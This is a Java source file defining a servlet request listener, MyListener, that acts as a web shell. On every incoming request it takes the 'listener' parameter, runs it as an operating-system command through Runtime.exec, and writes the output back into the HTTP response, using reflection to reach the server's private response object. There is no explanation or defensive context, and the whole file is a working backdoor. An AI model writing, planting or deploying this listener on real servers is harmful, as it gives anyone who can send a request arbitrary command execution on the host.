package com.axisx;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.lang.reflect.Field;

public class MyListener implements ServletRequestListener {
    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        HttpServletRequest req = (HttpServletRequest)servletRequestEvent.getServletRequest();

        try {
            HttpServletResponse resp = this.getResponseFromRequest(req);
            String cmd = req.getParameter("listener");
            String result = this.CommandExec(cmd);
            System.out.println(result);
//            resp.setContentType("text/html;charset=UTF-8");
            PrintWriter out = resp.getWriter();
            out.println(result);
            out.flush();
        } catch (Exception e) {

        }
    }
    public String CommandExec(String cmd) throws Exception {
        Runtime rt = Runtime.getRuntime();
        Process proc = rt.exec(cmd);
        InputStream stderr =  proc.getInputStream();
        InputStreamReader isr = new InputStreamReader(stderr);
        BufferedReader br = new BufferedReader(isr);
        String line = null;
        StringBuffer sb = new StringBuffer();
        while ((line = br.readLine()) != null) {
            sb.append(line + "\n");
        }
        return sb.toString();
    }

    public synchronized HttpServletResponse getResponseFromRequest(HttpServletRequest var1) throws IllegalAccessException {
        HttpServletResponse var2 = null;
        Field var3 = null;
        try {
            var3 = var1.getClass().getDeclaredField("_response");
        } catch (Exception var8) {
            try {
                var3=var1.getClass().getSuperclass().getDeclaredField("_response");
            } catch (Exception var7) {
            }
        }
        var3.setAccessible(true);
        var2 = (HttpServletResponse)var3.get(var1);

        return var2;
    }
}
